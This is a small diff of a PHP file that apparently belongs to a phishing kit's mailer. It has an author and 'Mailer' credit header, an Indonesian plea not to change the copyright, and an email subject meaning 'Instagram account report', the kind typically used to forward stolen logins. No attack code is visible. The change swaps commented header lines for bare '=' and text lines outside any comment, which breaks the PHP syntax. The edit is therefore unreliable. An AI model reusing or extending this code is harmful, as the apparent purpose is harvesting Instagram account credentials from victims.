@@ -1,9 +1,9 @@
 <?php
-###############################################
-##        Author: Moh.ImamNurCakra           ##
-##       Mailer: Imam                        ##
-##       Modifer: Mr.Ackerman~               ##
-###############################################
+===============================================
+         Author : Moh.ImamNurCakra           
+         Mailer : Imam                        
+         Modifer: Mr.Ackerman~               
+===============================================
 /* JANGAN GANTI COPYRIGHT NYA YA SAYANG */
 
 $subjek = 'Laporan Akun Instagram';
